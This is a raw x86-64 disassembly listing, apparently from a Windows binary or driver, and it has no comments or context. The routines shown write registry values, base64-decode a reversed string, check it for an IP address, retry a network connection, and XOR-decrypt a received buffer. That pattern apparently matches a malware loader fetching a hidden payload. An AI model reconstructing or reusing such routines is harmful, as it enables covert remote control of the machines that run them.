   117ab:	49 8b ce             	mov    %r14,%rcx
   117ae:	f2 ae                	repnz scas (%rdi),%al
   117b0:	48 8d 94 24 a0 02 00 	lea    0x2a0(%rsp),%rdx
   117b7:	00 
   117b8:	48 f7 d1             	not    %rcx
   117bb:	4c 8b c1             	mov    %rcx,%r8
   117be:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   117c3:	e8 78 2b 00 00       	call   0x14340
   117c8:	eb 12                	jmp    0x117dc
   117ca:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   117cf:	4c 8b c5             	mov    %rbp,%r8
   117d2:	ba 20 00 00 00       	mov    $0x20,%edx
   117d7:	e8 46 2a 00 00       	call   0x14222
   117dc:	b9 01 00 00 00       	mov    $0x1,%ecx
   117e1:	e8 5a fb ff ff       	call   0x11340
   117e6:	ba 00 10 00 00       	mov    $0x1000,%edx
   117eb:	b9 01 00 00 00       	mov    $0x1,%ecx
   117f0:	ff 15 32 38 00 00    	call   *0x3832(%rip)        # 0x15028
   117f6:	48 3b c3             	cmp    %rbx,%rax
   117f9:	74 4b                	je     0x11846
   117fb:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   11800:	48 8d 44 24 44       	lea    0x44(%rsp),%rax
   11805:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   1180a:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1180f:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   11814:	45 0f b7 cc          	movzwl %r12w,%r9d
   11818:	49 8b d5             	mov    %r13,%rdx
   1181b:	48 8b cd             	mov    %rbp,%rcx
   1181e:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   11823:	e8 5c 0b 00 00       	call   0x12384
   11828:	48 8b f8             	mov    %rax,%rdi
   1182b:	48 3b c3             	cmp    %rbx,%rax
   1182e:	74 16                	je     0x11846
   11830:	8b 44 24 40          	mov    0x40(%rsp),%eax
   11834:	3d 00 2c 00 00       	cmp    $0x2c00,%eax
   11839:	7d 30                	jge    0x1186b
   1183b:	33 d2                	xor    %edx,%edx
   1183d:	48 8b cf             	mov    %rdi,%rcx
   11840:	ff 15 1a 38 00 00    	call   *0x381a(%rip)        # 0x15060
   11846:	41 8b c6             	mov    %r14d,%eax
   11849:	48 8b 8c 24 a0 06 00 	mov    0x6a0(%rsp),%rcx
   11850:	00 
   11851:	48 33 cc             	xor    %rsp,%rcx
   11854:	e8 67 29 00 00       	call   0x141c0
   11859:	48 81 c4 b0 06 00 00 	add    $0x6b0,%rsp
   11860:	41 5e                	pop    %r14
   11862:	41 5d                	pop    %r13
   11864:	41 5c                	pop    %r12
   11866:	5f                   	pop    %rdi
   11867:	5e                   	pop    %rsi
   11868:	5d                   	pop    %rbp
   11869:	5b                   	pop    %rbx
   1186a:	c3                   	ret
   1186b:	8b 8f 00 28 00 00    	mov    0x2800(%rdi),%ecx
   11871:	05 00 d8 ff ff       	add    $0xffffd800,%eax
   11876:	3b c8                	cmp    %eax,%ecx
   11878:	77 c1                	ja     0x1183b
   1187a:	c1 e9 02             	shr    $0x2,%ecx
   1187d:	8b d1                	mov    %ecx,%edx
   1187f:	48 3b d3             	cmp    %rbx,%rdx
   11882:	7e 15                	jle    0x11899
   11884:	8b 87 04 28 00 00    	mov    0x2804(%rdi),%eax
   1188a:	48 ff c3             	inc    %rbx
   1188d:	31 84 9f 04 28 00 00 	xor    %eax,0x2804(%rdi,%rbx,4)
   11894:	48 3b da             	cmp    %rdx,%rbx
   11897:	7c eb                	jl     0x11884
   11899:	48 8d 0d 90 4e 00 00 	lea    0x4e90(%rip),%rcx        # 0x16730
   118a0:	4c 8d 0d 79 2f 00 00 	lea    0x2f79(%rip),%r9        # 0x14820
   118a7:	4c 8d 05 b2 2f 00 00 	lea    0x2fb2(%rip),%r8        # 0x14860
   118ae:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   118b3:	48 8d 8c 24 90 00 00 	lea    0x90(%rsp),%rcx
   118ba:	00 
   118bb:	ba 08 02 00 00       	mov    $0x208,%edx
   118c0:	e8 51 29 00 00       	call   0x14216
   118c5:	44 8b 87 00 28 00 00 	mov    0x2800(%rdi),%r8d
   118cc:	48 8d 97 08 28 00 00 	lea    0x2808(%rdi),%rdx
   118d3:	48 8d 8c 24 90 00 00 	lea    0x90(%rsp),%rcx
   118da:	00 
   118db:	e8 50 fb ff ff       	call   0x11430
   118e0:	b8 01 00 00 00       	mov    $0x1,%eax
   118e5:	e9 5f ff ff ff       	jmp    0x11849
   118ea:	cc                   	int3
   118eb:	cc                   	int3
   118ec:	cc                   	int3
   118ed:	cc                   	int3
   118ee:	cc                   	int3
   118ef:	cc                   	int3
   118f0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   118f5:	57                   	push   %rdi
   118f6:	48 81 ec e0 01 00 00 	sub    $0x1e0,%rsp
   118fd:	48 8b 05 fc 47 00 00 	mov    0x47fc(%rip),%rax        # 0x16100
   11904:	48 33 c4             	xor    %rsp,%rax
   11907:	48 89 84 24 d0 01 00 	mov    %rax,0x1d0(%rsp)
   1190e:	00 
   1190f:	33 db                	xor    %ebx,%ebx
   11911:	48 8d 8c 24 d2 00 00 	lea    0xd2(%rsp),%rcx
   11918:	00 
   11919:	33 d2                	xor    %edx,%edx
   1191b:	41 b8 fe 00 00 00    	mov    $0xfe,%r8d
   11921:	c7 44 24 48 01 00 00 	movl   $0x1,0x48(%rsp)
   11928:	00 
   11929:	c7 44 24 44 01 00 00 	movl   $0x1,0x44(%rsp)
   11930:	00 
   11931:	89 5c 24 40          	mov    %ebx,0x40(%rsp)
   11935:	66 89 9c 24 d0 00 00 	mov    %bx,0xd0(%rsp)
   1193c:	00 
   1193d:	e8 fe 28 00 00       	call   0x14240
   11942:	8d 7b 20             	lea    0x20(%rbx),%edi
   11945:	48 8d 8c 24 90 00 00 	lea    0x90(%rsp),%rcx
   1194c:	00 
   1194d:	48 8d 15 6c 2f 00 00 	lea    0x2f6c(%rip),%rdx        # 0x148c0
   11954:	4c 8b c7             	mov    %rdi,%r8
   11957:	e8 e4 29 00 00       	call   0x14340
   1195c:	48 8d 8c 24 b0 00 00 	lea    0xb0(%rsp),%rcx
   11963:	00 
   11964:	4c 8b c7             	mov    %rdi,%r8
   11967:	33 d2                	xor    %edx,%edx
   11969:	e8 d2 28 00 00       	call   0x14240
   1196e:	4c 8d 0d bb 4d 00 00 	lea    0x4dbb(%rip),%r9        # 0x16730
   11975:	4c 8d 05 64 2f 00 00 	lea    0x2f64(%rip),%r8        # 0x148e0
   1197c:	48 8d 8c 24 d0 00 00 	lea    0xd0(%rsp),%rcx
   11983:	00 
   11984:	ba 00 01 00 00       	mov    $0x100,%edx
   11989:	e8 42 f9 ff ff       	call   0x112d0
   1198e:	48 8d 05 fb 58 00 00 	lea    0x58fb(%rip),%rax        # 0x17290
   11995:	4c 8d 44 24 58       	lea    0x58(%rsp),%r8
   1199a:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   1199f:	48 8d 44 24 4c       	lea    0x4c(%rsp),%rax
   119a4:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   119a9:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   119ae:	45 33 c9             	xor    %r9d,%r9d
   119b1:	ba 3f 00 0f 00       	mov    $0xf003f,%edx
   119b6:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   119ba:	c7 44 24 58 30 00 00 	movl   $0x30,0x58(%rsp)
   119c1:	00 
   119c2:	48 89 5c 24 60       	mov    %rbx,0x60(%rsp)
   119c7:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   119cc:	c7 44 24 70 40 00 00 	movl   $0x40,0x70(%rsp)
   119d3:	00 
   119d4:	48 89 5c 24 78       	mov    %rbx,0x78(%rsp)
   119d9:	48 89 9c 24 80 00 00 	mov    %rbx,0x80(%rsp)
   119e0:	00 
   119e1:	ff 15 f9 36 00 00    	call   *0x36f9(%rip)        # 0x150e0
   119e7:	3b c3                	cmp    %ebx,%eax
   119e9:	7d 07                	jge    0x119f2
   119eb:	32 c0                	xor    %al,%al
   119ed:	e9 58 01 00 00       	jmp    0x11b4a
   119f2:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   119f7:	ff 15 33 36 00 00    	call   *0x3633(%rip)        # 0x15030
   119fd:	48 8b 15 94 58 00 00 	mov    0x5894(%rip),%rdx        # 0x17298
   11a04:	33 c0                	xor    %eax,%eax
   11a06:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   11a0a:	48 8d bc 24 d0 00 00 	lea    0xd0(%rsp),%rdi
   11a11:	00 
   11a12:	4c 8d 05 07 2f 00 00 	lea    0x2f07(%rip),%r8        # 0x14920
   11a19:	66 f2 af             	repnz scas (%rdi),%ax
   11a1c:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   11a22:	48 f7 d1             	not    %rcx
   11a25:	8d 04 09             	lea    (%rcx,%rcx,1),%eax
   11a28:	33 c9                	xor    %ecx,%ecx
   11a2a:	89 44 24 28          	mov    %eax,0x28(%rsp)
   11a2e:	48 8d 84 24 d0 00 00 	lea    0xd0(%rsp),%rax
   11a35:	00 
   11a36:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   11a3b:	ff 15 af 36 00 00    	call   *0x36af(%rip)        # 0x150f0
   11a41:	3b c3                	cmp    %ebx,%eax
   11a43:	7c a6                	jl     0x119eb
   11a45:	48 8b 15 4c 58 00 00 	mov    0x584c(%rip),%rdx        # 0x17298
   11a4c:	bf 04 00 00 00       	mov    $0x4,%edi
   11a51:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   11a56:	4c 8d 05 e3 2e 00 00 	lea    0x2ee3(%rip),%r8        # 0x14940
   11a5d:	44 8b cf             	mov    %edi,%r9d
   11a60:	33 c9                	xor    %ecx,%ecx
   11a62:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   11a66:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   11a6b:	ff 15 7f 36 00 00    	call   *0x367f(%rip)        # 0x150f0
   11a71:	3b c3                	cmp    %ebx,%eax
   11a73:	0f 8c 72 ff ff ff    	jl     0x119eb
   11a79:	48 8b 15 18 58 00 00 	mov    0x5818(%rip),%rdx        # 0x17298
   11a80:	48 8d 44 24 44       	lea    0x44(%rsp),%rax
   11a85:	4c 8d 05 c4 2e 00 00 	lea    0x2ec4(%rip),%r8        # 0x14950
   11a8c:	44 8b cf             	mov    %edi,%r9d
   11a8f:	33 c9                	xor    %ecx,%ecx
   11a91:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   11a95:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   11a9a:	ff 15 50 36 00 00    	call   *0x3650(%rip)        # 0x150f0
   11aa0:	3b c3                	cmp    %ebx,%eax
   11aa2:	0f 8c 43 ff ff ff    	jl     0x119eb
   11aa8:	48 8b 15 e9 57 00 00 	mov    0x57e9(%rip),%rdx        # 0x17298
   11aaf:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   11ab4:	4c 8d 05 b5 2e 00 00 	lea    0x2eb5(%rip),%r8        # 0x14970
   11abb:	44 8b cf             	mov    %edi,%r9d
   11abe:	33 c9                	xor    %ecx,%ecx
   11ac0:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   11ac4:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   11ac9:	ff 15 21 36 00 00    	call   *0x3621(%rip)        # 0x150f0
   11acf:	3b c3                	cmp    %ebx,%eax
   11ad1:	0f 8c 14 ff ff ff    	jl     0x119eb
   11ad7:	48 8b 15 ba 57 00 00 	mov    0x57ba(%rip),%rdx        # 0x17298
   11ade:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   11ae3:	4c 8d 05 96 2e 00 00 	lea    0x2e96(%rip),%r8        # 0x14980
   11aea:	44 8b cf             	mov    %edi,%r9d
   11aed:	33 c9                	xor    %ecx,%ecx
   11aef:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   11af3:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   11af8:	c7 44 24 40 01 00 00 	movl   $0x1,0x40(%rsp)
   11aff:	00 
   11b00:	ff 15 ea 35 00 00    	call   *0x35ea(%rip)        # 0x150f0
   11b06:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   11b0a:	33 c0                	xor    %eax,%eax
   11b0c:	48 8d bc 24 90 00 00 	lea    0x90(%rsp),%rdi
   11b13:	00 
   11b14:	66 f2 af             	repnz scas (%rdi),%ax
   11b17:	44 8d 48 01          	lea    0x1(%rax),%r9d
   11b1b:	4c 8d 05 6e 2e 00 00 	lea    0x2e6e(%rip),%r8        # 0x14990
   11b22:	48 f7 d1             	not    %rcx
   11b25:	8d 14 09             	lea    (%rcx,%rcx,1),%edx
   11b28:	48 8d 8c 24 90 00 00 	lea    0x90(%rsp),%rcx
   11b2f:	00 
   11b30:	89 54 24 28          	mov    %edx,0x28(%rsp)
   11b34:	48 8b 15 5d 57 00 00 	mov    0x575d(%rip),%rdx        # 0x17298
   11b3b:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   11b40:	33 c9                	xor    %ecx,%ecx
   11b42:	ff 15 a8 35 00 00    	call   *0x35a8(%rip)        # 0x150f0
   11b48:	b0 01                	mov    $0x1,%al
   11b4a:	48 8b 8c 24 d0 01 00 	mov    0x1d0(%rsp),%rcx
   11b51:	00 
   11b52:	48 33 cc             	xor    %rsp,%rcx
   11b55:	e8 66 26 00 00       	call   0x141c0
   11b5a:	48 8b 9c 24 f0 01 00 	mov    0x1f0(%rsp),%rbx
   11b61:	00 
   11b62:	48 81 c4 e0 01 00 00 	add    $0x1e0,%rsp
   11b69:	5f                   	pop    %rdi
   11b6a:	c3                   	ret
   11b6b:	cc                   	int3
   11b6c:	cc                   	int3
   11b6d:	cc                   	int3
   11b6e:	cc                   	int3
   11b6f:	cc                   	int3
   11b70:	cc                   	int3
   11b71:	cc                   	int3
   11b72:	cc                   	int3
   11b73:	cc                   	int3
   11b74:	48 89 6c 24 08       	mov    %rbp,0x8(%rsp)
   11b79:	57                   	push   %rdi
   11b7a:	48 81 ec a0 04 00 00 	sub    $0x4a0,%rsp
   11b81:	48 8b 05 78 45 00 00 	mov    0x4578(%rip),%rax        # 0x16100
   11b88:	48 33 c4             	xor    %rsp,%rax
   11b8b:	48 89 84 24 90 04 00 	mov    %rax,0x490(%rsp)
   11b92:	00 
   11b93:	48 8d 8c 24 81 03 00 	lea    0x381(%rsp),%rcx
   11b9a:	00 
   11b9b:	33 d2                	xor    %edx,%edx
   11b9d:	41 b8 03 01 00 00    	mov    $0x103,%r8d
   11ba3:	c6 84 24 80 03 00 00 	movb   $0x0,0x380(%rsp)
   11baa:	00 
   11bab:	e8 90 26 00 00       	call   0x14240
   11bb0:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   11bb6:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   11bbb:	33 d2                	xor    %edx,%edx
   11bbd:	41 b8 40 03 00 00    	mov    $0x340,%r8d
   11bc3:	e8 78 26 00 00       	call   0x14240
   11bc8:	b9 03 00 00 00       	mov    $0x3,%ecx
   11bcd:	e8 6e f7 ff ff       	call   0x11340
   11bd2:	4c 8d 05 c7 2d 00 00 	lea    0x2dc7(%rip),%r8        # 0x149a0
   11bd9:	48 8d 15 30 2c 00 00 	lea    0x2c30(%rip),%rdx        # 0x14810
   11be0:	48 8d 8c 24 80 03 00 	lea    0x380(%rsp),%rcx
   11be7:	00 
   11be8:	ff 15 62 34 00 00    	call   *0x3462(%rip)        # 0x15050
   11bee:	48 8d bc 24 80 03 00 	lea    0x380(%rsp),%rdi
   11bf5:	00 
   11bf6:	48 8d 94 24 80 03 00 	lea    0x380(%rsp),%rdx
   11bfd:	00 
   11bfe:	8a 02                	mov    (%rdx),%al
   11c00:	48 ff c2             	inc    %rdx
   11c03:	84 c0                	test   %al,%al
   11c05:	75 f7                	jne    0x11bfe
   11c07:	48 8d 84 24 80 03 00 	lea    0x380(%rsp),%rax
   11c0e:	00 
   11c0f:	48 83 ea 02          	sub    $0x2,%rdx
   11c13:	48 3b c2             	cmp    %rdx,%rax
   11c16:	73 13                	jae    0x11c2b
   11c18:	8a 02                	mov    (%rdx),%al
   11c1a:	8a 0f                	mov    (%rdi),%cl
   11c1c:	88 07                	mov    %al,(%rdi)
   11c1e:	88 0a                	mov    %cl,(%rdx)
   11c20:	48 ff ca             	dec    %rdx
   11c23:	48 ff c7             	inc    %rdi
   11c26:	48 3b fa             	cmp    %rdx,%rdi
   11c29:	72 ed                	jb     0x11c18
   11c2b:	33 c0                	xor    %eax,%eax
   11c2d:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   11c31:	48 8d bc 24 80 03 00 	lea    0x380(%rsp),%rdi
   11c38:	00 
   11c39:	f2 ae                	repnz scas (%rdi),%al
   11c3b:	48 8d 94 24 80 03 00 	lea    0x380(%rsp),%rdx
   11c42:	00 
   11c43:	4c 8d 84 24 80 03 00 	lea    0x380(%rsp),%r8
   11c4a:	00 
   11c4b:	48 f7 d1             	not    %rcx
   11c4e:	48 8b f8             	mov    %rax,%rdi
   11c51:	48 83 e9 01          	sub    $0x1,%rcx
   11c55:	4c 8b d1             	mov    %rcx,%r10
   11c58:	0f 84 90 00 00 00    	je     0x11cee
   11c5e:	4c 8d 1d 5b 35 00 00 	lea    0x355b(%rip),%r11        # 0x151c0
   11c65:	80 3a 0d             	cmpb   $0xd,(%rdx)
   11c68:	74 75                	je     0x11cdf
   11c6a:	80 3a 0a             	cmpb   $0xa,(%rdx)
   11c6d:	74 70                	je     0x11cdf
   11c6f:	48 0f be 02          	movsbq (%rdx),%rax
   11c73:	48 83 c2 02          	add    $0x2,%rdx
   11c77:	46 0f be 0c 18       	movsbl (%rax,%r11,1),%r9d
   11c7c:	48 0f be 42 ff       	movsbq -0x1(%rdx),%rax
   11c81:	42 0f be 0c 18       	movsbl (%rax,%r11,1),%ecx
   11c86:	41 c1 e1 12          	shl    $0x12,%r9d
   11c8a:	c1 e1 0c             	shl    $0xc,%ecx
   11c8d:	44 03 c9             	add    %ecx,%r9d
   11c90:	41 8b c1             	mov    %r9d,%eax
   11c93:	c1 f8 10             	sar    $0x10,%eax
   11c96:	41 88 00             	mov    %al,(%r8)
   11c99:	49 ff c0             	inc    %r8
   11c9c:	80 3a 3d             	cmpb   $0x3d,(%rdx)
   11c9f:	74 38                	je     0x11cd9
   11ca1:	48 0f be 02          	movsbq (%rdx),%rax
   11ca5:	48 ff c2             	inc    %rdx
   11ca8:	42 0f be 0c 18       	movsbl (%rax,%r11,1),%ecx
   11cad:	c1 e1 06             	shl    $0x6,%ecx
   11cb0:	44 03 c9             	add    %ecx,%r9d
   11cb3:	41 8b c1             	mov    %r9d,%eax
   11cb6:	c1 f8 08             	sar    $0x8,%eax
   11cb9:	41 88 00             	mov    %al,(%r8)
   11cbc:	49 ff c0             	inc    %r8
   11cbf:	80 3a 3d             	cmpb   $0x3d,(%rdx)
   11cc2:	74 15                	je     0x11cd9
   11cc4:	48 0f be 02          	movsbq (%rdx),%rax
   11cc8:	48 ff c2             	inc    %rdx
   11ccb:	42 0f be 04 18       	movsbl (%rax,%r11,1),%eax
   11cd0:	44 03 c8             	add    %eax,%r9d
   11cd3:	45 88 08             	mov    %r9b,(%r8)
   11cd6:	49 ff c0             	inc    %r8
   11cd9:	48 83 c7 04          	add    $0x4,%rdi
   11cdd:	eb 06                	jmp    0x11ce5
   11cdf:	48 ff c2             	inc    %rdx
   11ce2:	48 ff c7             	inc    %rdi
   11ce5:	49 3b fa             	cmp    %r10,%rdi
   11ce8:	0f 82 77 ff ff ff    	jb     0x11c65
   11cee:	41 c6 00 00          	movb   $0x0,(%r8)
   11cf2:	48 8d 15 87 2b 00 00 	lea    0x2b87(%rip),%rdx        # 0x14880
   11cf9:	48 8d 8c 24 80 03 00 	lea    0x380(%rsp),%rcx
   11d00:	00 
   11d01:	41 b8 05 00 00 00    	mov    $0x5,%r8d
   11d07:	48 8d ac 24 80 03 00 	lea    0x380(%rsp),%rbp
   11d0e:	00 
   11d0f:	ff 15 43 33 00 00    	call   *0x3343(%rip)        # 0x15058
   11d15:	85 c0                	test   %eax,%eax
   11d17:	0f 84 62 01 00 00    	je     0x11e7f
   11d1d:	48 8d 15 6c 2b 00 00 	lea    0x2b6c(%rip),%rdx        # 0x14890
   11d24:	48 8d 8c 24 80 03 00 	lea    0x380(%rsp),%rcx
   11d2b:	00 
   11d2c:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   11d32:	ff 15 20 33 00 00    	call   *0x3320(%rip)        # 0x15058
   11d38:	48 8d bc 24 87 03 00 	lea    0x387(%rsp),%rdi
   11d3f:	00 
   11d40:	48 8d 15 59 2b 00 00 	lea    0x2b59(%rip),%rdx        # 0x148a0
   11d47:	85 c0                	test   %eax,%eax
   11d49:	48 0f 45 fd          	cmovne %rbp,%rdi
   11d4d:	48 8b cf             	mov    %rdi,%rcx
   11d50:	ff 15 12 33 00 00    	call   *0x3312(%rip)        # 0x15068
   11d56:	48 85 c0             	test   %rax,%rax
   11d59:	74 13                	je     0x11d6e
   11d5b:	48 8d 48 01          	lea    0x1(%rax),%rcx
   11d5f:	ff 15 83 33 00 00    	call   *0x3383(%rip)        # 0x150e8
   11d65:	89 84 24 48 01 00 00 	mov    %eax,0x148(%rsp)
   11d6c:	eb 0b                	jmp    0x11d79
   11d6e:	c7 84 24 48 01 00 00 	movl   $0x50,0x148(%rsp)
   11d75:	50 00 00 00 
   11d79:	48 8d 15 30 2b 00 00 	lea    0x2b30(%rip),%rdx        # 0x148b0
   11d80:	48 8b cf             	mov    %rdi,%rcx
   11d83:	ff 15 df 32 00 00    	call   *0x32df(%rip)        # 0x15068
   11d89:	48 85 c0             	test   %rax,%rax
   11d8c:	0f 84 ed 00 00 00    	je     0x11e7f
   11d92:	bd 04 01 00 00       	mov    $0x104,%ebp
   11d97:	4c 8d 48 01          	lea    0x1(%rax),%r9
   11d9b:	4c 8d 05 6e 2a 00 00 	lea    0x2a6e(%rip),%r8        # 0x14810
   11da2:	48 8d 8c 24 6c 01 00 	lea    0x16c(%rsp),%rcx
   11da9:	00 
   11daa:	48 8b d5             	mov    %rbp,%rdx
   11dad:	e8 b2 f4 ff ff       	call   0x11264
   11db2:	48 8d 8c 24 6c 01 00 	lea    0x16c(%rsp),%rcx
   11db9:	00 
   11dba:	ba 2f 00 00 00       	mov    $0x2f,%edx
   11dbf:	ff 15 33 33 00 00    	call   *0x3333(%rip)        # 0x150f8
   11dc5:	4c 8d 05 44 2a 00 00 	lea    0x2a44(%rip),%r8        # 0x14810
   11dcc:	48 8b d5             	mov    %rbp,%rdx
   11dcf:	4c 8d 48 01          	lea    0x1(%rax),%r9
   11dd3:	48 8d 8c 24 70 02 00 	lea    0x270(%rsp),%rcx
   11dda:	00 
   11ddb:	48 85 c0             	test   %rax,%rax
   11dde:	75 08                	jne    0x11de8
   11de0:	4c 8d 8c 24 6c 01 00 	lea    0x16c(%rsp),%r9
   11de7:	00 
   11de8:	e8 77 f4 ff ff       	call   0x11264
   11ded:	48 8d 15 ac 2a 00 00 	lea    0x2aac(%rip),%rdx        # 0x148a0
   11df4:	48 8b cf             	mov    %rdi,%rcx
   11df7:	ff 15 6b 32 00 00    	call   *0x326b(%rip)        # 0x15068
   11dfd:	48 85 c0             	test   %rax,%rax
   11e00:	75 10                	jne    0x11e12
   11e02:	48 8d 15 a7 2a 00 00 	lea    0x2aa7(%rip),%rdx        # 0x148b0
   11e09:	48 8b cf             	mov    %rdi,%rcx
   11e0c:	ff 15 56 32 00 00    	call   *0x3256(%rip)        # 0x15068
   11e12:	48 2b c7             	sub    %rdi,%rax
   11e15:	48 8d 4c 24 41       	lea    0x41(%rsp),%rcx
   11e1a:	48 8b d7             	mov    %rdi,%rdx
   11e1d:	4c 8b c0             	mov    %rax,%r8
   11e20:	e8 1b 25 00 00       	call   0x14340
   11e25:	8a 4c 24 41          	mov    0x41(%rsp),%cl
   11e29:	33 ff                	xor    %edi,%edi
   11e2b:	84 c9                	test   %cl,%cl
   11e2d:	74 1a                	je     0x11e49
   11e2f:	48 8d 54 24 41       	lea    0x41(%rsp),%rdx
   11e34:	8d 41 d0             	lea    -0x30(%rcx),%eax
   11e37:	3c 09                	cmp    $0x9,%al
   11e39:	76 05                	jbe    0x11e40
   11e3b:	80 f9 2e             	cmp    $0x2e,%cl
   11e3e:	75 39                	jne    0x11e79
   11e40:	48 ff c2             	inc    %rdx
   11e43:	8a 0a                	mov    (%rdx),%cl
   11e45:	84 c9                	test   %cl,%cl
   11e47:	75 eb                	jne    0x11e34
   11e49:	8a 54 24 42          	mov    0x42(%rsp),%dl
   11e4d:	84 d2                	test   %dl,%dl
   11e4f:	74 28                	je     0x11e79
   11e51:	48 8d 4c 24 42       	lea    0x42(%rsp),%rcx
   11e56:	8a 41 ff             	mov    -0x1(%rcx),%al
   11e59:	2c 30                	sub    $0x30,%al
   11e5b:	3c 09                	cmp    $0x9,%al
   11e5d:	77 07                	ja     0x11e66
   11e5f:	80 fa 2e             	cmp    $0x2e,%dl
   11e62:	75 02                	jne    0x11e66
   11e64:	ff c7                	inc    %edi
   11e66:	48 ff c1             	inc    %rcx
   11e69:	8a 11                	mov    (%rcx),%dl
   11e6b:	80 fa 00             	cmp    $0x0,%dl
   11e6e:	75 e6                	jne    0x11e56
   11e70:	83 ff 03             	cmp    $0x3,%edi
   11e73:	75 04                	jne    0x11e79
   11e75:	b0 01                	mov    $0x1,%al
   11e77:	eb 02                	jmp    0x11e7b
   11e79:	32 c0                	xor    %al,%al
   11e7b:	88 44 24 40          	mov    %al,0x40(%rsp)
   11e7f:	48 8d 3d aa 48 00 00 	lea    0x48aa(%rip),%rdi        # 0x16730
   11e86:	eb 0a                	jmp    0x11e92
   11e88:	b9 2c 01 00 00       	mov    $0x12c,%ecx
   11e8d:	e8 ae f4 ff ff       	call   0x11340
   11e92:	44 8b 84 24 48 01 00 	mov    0x148(%rsp),%r8d
   11e99:	00 
   11e9a:	8a 4c 24 40          	mov    0x40(%rsp),%cl
   11e9e:	4c 8d 8c 24 70 02 00 	lea    0x270(%rsp),%r9
   11ea5:	00 
   11ea6:	48 8d 54 24 41       	lea    0x41(%rsp),%rdx
   11eab:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   11eb0:	e8 1b f7 ff ff       	call   0x115d0
   11eb5:	83 f8 01             	cmp    $0x1,%eax
   11eb8:	75 ce                	jne    0x11e88
   11eba:	48 8d 0d cf 53 00 00 	lea    0x53cf(%rip),%rcx        # 0x17290
   11ec1:	e8 2a fa ff ff       	call   0x118f0
   11ec6:	48 8d 0d c3 53 00 00 	lea    0x53c3(%rip),%rcx        # 0x17290
   11ecd:	ff 15 2d 32 00 00    	call   *0x322d(%rip)        # 0x15100
   11ed3:	85 c0                	test   %eax,%eax
   11ed5:	79 07                	jns    0x11ede
   11ed7:	b9 b4 00 00 00       	mov    $0xb4,%ecx
   11edc:	eb af                	jmp    0x11e8d
   11ede:	48 8b 8c 24 90 04 00 	mov    0x490(%rsp),%rcx
   11ee5:	00 
   11ee6:	48 33 cc             	xor    %rsp,%rcx
   11ee9:	e8 d2 22 00 00       	call   0x141c0
   11eee:	48 8b ac 24 b0 04 00 	mov    0x4b0(%rsp),%rbp
   11ef5:	00 
   11ef6:	48 81 c4 a0 04 00 00 	add    $0x4a0,%rsp
   11efd:	5f                   	pop    %rdi
   11efe:	c3                   	ret
   11eff:	cc                   	int3
   11f00:	cc                   	int3
   11f01:	cc                   	int3
   11f02:	cc                   	int3
   11f03:	cc                   	int3
   11f04:	cc                   	int3
   11f05:	cc                   	int3
   11f06:	cc                   	int3
   11f07:	cc                   	int3
   11f08:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   11f0d:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   11f12:	56                   	push   %rsi
   11f13:	57                   	push   %rdi
   11f14:	41 54                	push   %r12
   11f16:	48 81 ec 60 09 00 00 	sub    $0x960,%rsp
   11f1d:	48 8b 05 dc 41 00 00 	mov    0x41dc(%rip),%rax        # 0x16100
   11f24:	48 33 c4             	xor    %rsp,%rax
   11f27:	48 89 84 24 50 09 00 	mov    %rax,0x950(%rsp)
   11f2e:	00 
   11f2f:	48 8b d9             	mov    %rcx,%rbx
   11f32:	4c 8b e2             	mov    %rdx,%r12
   11f35:	48 8d 8c 24 51 01 00 	lea    0x151(%rsp),%rcx
   11f3c:	00 
   11f3d:	33 d2                	xor    %edx,%edx
   11f3f:	41 b8 ff 07 00 00    	mov    $0x7ff,%r8d
   11f45:	c6 84 24 50 01 00 00 	movb   $0x0,0x150(%rsp)
   11f4c:	00 
   11f4d:	e8 ee 22 00 00       	call   0x14240
   11f52:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   11f57:	bf 00 08 00 00       	mov    $0x800,%edi
   11f5c:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   11f61:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   11f66:	48 8d 94 24 50 01 00 	lea    0x150(%rsp),%rdx
   11f6d:	00 
   11f6e:	45 33 c9             	xor    %r9d,%r9d
   11f71:	44 8b c7             	mov    %edi,%r8d
   11f74:	48 8b cb             	mov    %rbx,%rcx
   11f77:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   11f7c:	c7 44 24 30 10 00 00 	movl   $0x10,0x30(%rsp)
   11f83:	00 
   11f84:	e8 23 0d 00 00       	call   0x12cac
   11f89:	83 f8 ff             	cmp    $0xffffffff,%eax
   11f8c:	0f 84 6a 01 00 00    	je     0x120fc
